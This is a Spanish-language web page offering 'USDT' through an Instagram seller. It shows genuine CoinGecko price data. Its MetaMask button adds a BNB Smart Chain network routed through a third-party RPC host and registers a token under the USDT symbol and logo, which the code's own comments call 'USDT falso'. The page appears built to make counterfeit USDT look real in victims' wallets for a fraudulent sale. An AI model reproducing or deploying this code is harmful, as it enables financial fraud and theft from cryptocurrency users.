<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>USDT 游눶 con LinkUpAgency</title>
<style>
  body { font-family: Arial, sans-serif; background: #121212; color: white; text-align: center; padding: 2rem; }
  button { background: #1f8ef1; color: white; border: none; padding: 1rem 2rem; border-radius: 8px; font-size: 1.1rem; cursor: pointer; margin: 1rem; }
  button:hover { background: #0d6efd; }
  #priceData { margin-top: 2rem; }
  #logo { max-width: 200px; margin-bottom: 1rem; }
  a { color: #1f8ef1; text-decoration: none; font-weight: bold; }
</style>
</head>
<body>

<img id="logo" src="https://i.imgur.com/9R6ttjs.png" alt="LinkUpAgency Logo" />

<h1>USDT 游눶 con LinkUpAgency</h1>

<button id="connectBtn">Conectar MetaMask y A침adir Red & Token</button>
<button onclick="window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1','_blank')">Contactar o Comprar con LinkUp 游댕</button>

<div id="priceData">
  <h2>Precio USDT real</h2>
  <p>Precio: <span id="price">Cargando...</span> USD</p>
  <p>Capitalizaci칩n: <span id="marketCap">Cargando...</span> USD</p>
  <p>Volumen 24h: <span id="volume">Cargando...</span> USD</p>
  <canvas id="chart" width="400" height="200"></canvas>
</div>

<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script>
// Datos API CoinGecko para USDT
async function fetchPriceData() {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/coins/tether');
    const data = await res.json();
    const price = data.market_data.current_price.usd;
    const marketCap = data.market_data.market_cap.usd;
    const volume = data.market_data.total_volume.usd;

    document.getElementById('price').textContent = price.toFixed(4);
    document.getElementById('marketCap').textContent = marketCap.toLocaleString();
    document.getElementById('volume').textContent = volume.toLocaleString();

    // Extraemos precios para gr치fico 칰ltimos 7 d칤as
    const chartRes = await fetch('https://api.coingecko.com/api/v3/coins/tether/market_chart?vs_currency=usd&days=7');
    const chartData = await chartRes.json();

    const labels = chartData.prices.map(p => {
      const d = new Date(p[0]);
      return `${d.getDate()}/${d.getMonth()+1}`;
    });
    const prices = chartData.prices.map(p => p[1]);

    const ctx = document.getElementById('chart').getContext('2d');
    new Chart(ctx, {
      type: 'line',
      data: {
        labels,
        datasets: [{
          label: 'Precio USDT (USD)',
          data: prices,
          borderColor: '#1f8ef1',
          backgroundColor: 'rgba(31,142,241,0.2)',
          fill: true,
          tension: 0.3,
          pointRadius: 0
        }]
      },
      options: {
        scales: {
          x: { display: true },
          y: { display: true }
        },
        plugins: {
          legend: { labels: { color: 'white' } }
        },
        responsive: true,
        maintainAspectRatio: false
      }
    });
  } catch (e) {
    document.getElementById('price').textContent = 'Error al cargar';
    document.getElementById('marketCap').textContent = 'Error';
    document.getElementById('volume').textContent = 'Error';
    console.error(e);
  }
}
fetchPriceData();


// Funci칩n para a침adir red y token Catflash en MetaMask
async function connectAndAdd() {
  if (!window.ethereum) {
    alert("Necesitas instalar MetaMask para continuar.");
    return;
  }

  try {
    // Solicitar conexi칩n
    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    alert(`Conectado con la cuenta: ${accounts[0]}`);

    // A침adir red BSC Catflash
    await ethereum.request({
      method: 'wallet_addEthereumChain',
      params: [{
        chainId: '0x38',
        chainName: 'BNB Smart Chain Mainnet',
        rpcUrls: ['https://dataseed-binance.catflash.cat/'],
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        blockExplorerUrls: ['https://bscscan.com']
      }]
    });
    alert("Red BNB Smart Chain a침adida correctamente.");

    // A침adir token USDT falso Catflash
    const wasAdded = await ethereum.request({
      method: 'wallet_watchAsset',
      params: {
        type: 'ERC20',
        options: {
          address: '0x3c8B650257cFb3f120dBfa2e2AaFdA3c0A5D7B6E', // Token USDT falso Catflash
          symbol: 'USDT',
          decimals: 18,
          image: 'https://cryptologos.cc/logos/tether-usdt-logo.png?v=032'
        },
      },
    });

    if (wasAdded) {
      alert('Token USDT falso a침adido a MetaMask');
    } else {
      alert('Token USDT falso NO fue a침adido a MetaMask');
    }

  } catch (error) {
    alert('Error: ' + error.message);
    console.error(error);
  }
}

document.getElementById('connectBtn').addEventListener('click', connectAndAdd);
</script>

</body>
  </html>
  
